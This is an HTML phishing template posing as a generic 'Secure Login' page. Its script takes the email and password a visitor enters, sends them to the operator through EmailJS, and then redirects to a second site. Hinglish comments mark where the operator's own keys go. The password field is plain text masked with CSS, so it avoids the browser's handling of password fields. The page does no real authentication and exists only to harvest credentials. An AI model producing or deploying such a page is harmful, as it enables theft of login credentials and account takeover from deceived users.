<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="sORTMUAbgoRzPbKt6bp9Iorulw6LMKjsr8kpBMdNLx8" />
  <title>Secure Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f4f4f4;
      margin: 0;
    }

    .container {
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
      width: 350px;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #222;
    }

    label {
      font-weight: bold;
      display: block;
      margin-top: 10px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 16px;
    }

    /* Password dots ka effect without using input type="password" */
    .secure-text {
      -webkit-text-security: disc;
      text-security: disc;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #007bff;
      border: none;
      color: white;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.3s ease;
    }

    button:hover {
      background: #0056b3;
    }

    .error {
      color: red;
      font-size: 14px;
      display: none;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Login</h2>
    <form id="secureForm">
      <label for="email">Email</label>
      <input type="email" id="email" name="user_mail" placeholder="Enter your email" required>

      <label for="pass">Password</label>
      <input type="text" id="pass" name="access_key" class="secure-text" placeholder="Enter your password" required>

      <p class="error" id="errorMsg">Please fill in both fields</p>
      <button type="submit">Submit</button>
    </form>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function() {
      emailjs.init("YOUR_EMAILJS_PUBLIC_KEY"); // <-- yahan apna EmailJS public key lagao
    })();

    const form = document.getElementById("secureForm");
    const errorMsg = document.getElementById("errorMsg");

    form.addEventListener("submit", function(event) {
      event.preventDefault();

      const email = document.getElementById("email").value.trim();
      const pass = document.getElementById("pass").value.trim();

      if (email === "" || pass === "") {
        errorMsg.style.display = "block";
        return;
      } else {
        errorMsg.style.display = "none";
      }

      // EmailJS pe data bhejna
      emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
        email_id: email,
        access_key: pass
      }).then(function() {
        // Data successfully sent â†’ redirect karo
        window.location.href = "https://your-second-site-link.com";
      }, function(error) {
        alert("Error: " + JSON.stringify(error));
      });
    });
  </script>
</body>
</html>
